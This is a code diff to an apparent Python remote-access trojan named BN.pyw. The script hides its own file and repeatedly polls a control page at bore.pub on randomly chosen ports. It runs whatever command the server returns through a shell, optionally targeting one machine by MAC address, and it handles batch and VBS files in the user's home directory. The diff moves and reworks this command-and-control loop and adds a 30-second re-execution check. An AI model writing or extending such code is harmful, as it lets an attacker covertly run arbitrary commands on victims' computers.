@@ -15,6 +15,10 @@ import threading
 # Hide BN.pyw
 subprocess.Popen("attrib +h BN.pyw", shell=True)
 
+# Store the previously executed command and files with timestamps
+previous_command = None
+previous_files = {}
+
 # Function to clear the console screen
 def clear_screen():
     if os.name == 'nt':
@@ -32,35 +36,6 @@ def send_data_to_url(url, data):
         return f"Data sent to {url}: {response.text}"
     except Exception as e:
         return f"Error sending data to {url}: {str(e)}"
-
-
-# Function to continuously receive and process data
-def receive_data():
-    global previous_data
-    port = port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-    php_script_url = f'http://bore.pub:{port}/Control.php'
-    while True:
-        response = requests.get(php_script_url)
-        data = response.text
-
-        if data != "" and data != previous_data:
-            if '::' in data:
-                mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
-                mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
-                received_mac, command = data.split('::', 1)
-                if received_mac == mac:
-                    subprocess.Popen(f"{command}", shell=True)
-                    previous_data = data
-                else:
-                    print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
-            else:
-                subprocess.Popen(f"{data}", shell=True)
-                previous_data = data
-previous_data = ""
-
-# Start the data receiving thread
-receive_thread = threading.Thread(target=receive_data)
-receive_thread.start()
 
 # Function to download and save a file
 def download_file(url, save_path):
@@ -131,21 +106,56 @@ def get_system_info():
         print(f"Error retrieving system information: {str(e)}")
         return None
 
-# Define URLs and paths
-port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-php_script_url = f'http://bore.pub:{port}/Control.php'
-home_directory = os.path.expanduser("~")
-web_page1_path = os.path.join(home_directory, "Script.bat")
-vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
-
-# Start the data
-# Start the data receiving thread
-receive_thread = threading.Thread(target=receive_data)
-receive_thread.start()
-
-# Main loop for other tasks
 while True:
     try:
+        # Function to continuously receive and process data
+        def receive_data():
+            global previous_command, previous_files
+
+            # Your code to fetch data from the PHP script goes here
+            port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+            php_script_url = f'http://bore.pub:{port}/Control.php'
+            
+            response = requests.get(php_script_url)
+            data = response.text.strip()
+
+            if data != "" and data != previous_command:
+                if '::' in data:
+                    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+                    mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
+                    received_mac, file_to_execute = data.split('::', 1)
+                    if received_mac == mac:
+                        # Check if the received file has been executed recently
+                        if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
+                            # Execute the file
+                            subprocess.Popen(f"{file_to_execute}", shell=True)
+                            previous_files[file_to_execute] = time.time()
+                        else:
+                            print(f"Skipping file execution: File executed within 30 seconds.")
+                    else:
+                        print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
+                else:
+                    subprocess.Popen(f"{data}", shell=True)
+                
+                previous_command = data
+
+        previous_command = ""
+        previous_files = {}
+
+        # Start the data receiving thread
+        receive_thread = threading.Thread(target=receive_data)
+        receive_thread.start()
+
+        # Add any additional code or conditions for the loop as needed
+        time.sleep(1)  # Example: Sleep for 1 second between iterations
+
+        # Define URLs and paths
+        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+        php_script_url = f'http://bore.pub:{port}/Control.php'
+        home_directory = os.path.expanduser("~")
+        web_page1_path = os.path.join(home_directory, "Script.bat")
+        vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
+
         # Delete existing files
         for file_path in [web_page1_path, vbs_file_path]:
             if os.path.exists(file_path):
@@ -179,8 +189,6 @@ while True:
 
             for result in results:
                 print(result)
-
-        time.sleep(0)
 
     except Exception as e:
         print(f"Error: {str(e)}")
